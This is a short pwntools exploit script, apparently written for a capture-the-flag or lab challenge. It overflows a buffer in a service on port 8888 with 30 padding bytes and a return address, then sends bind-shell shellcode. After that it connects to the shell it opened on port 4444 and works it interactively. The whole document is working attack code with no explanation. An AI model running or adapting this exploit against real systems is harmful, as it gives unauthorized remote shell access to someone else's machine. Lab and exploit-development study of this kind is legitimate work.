from pwn import *
context.arch = "amd64"
context.log_level = "debug"

io = remote("127.0.0.1",8888)
#io = remote("10.30.0.139",8888)

payload = b"A"*30
sc = asm(shellcraft.bindsh(4444))
payload = b"A"*30+p64(0x40120c)+sc 
io.send(payload)

sh = remote("127.0.0.1",4444)
#sh = remote("10.30.0.139",4444)
sh.interactive()
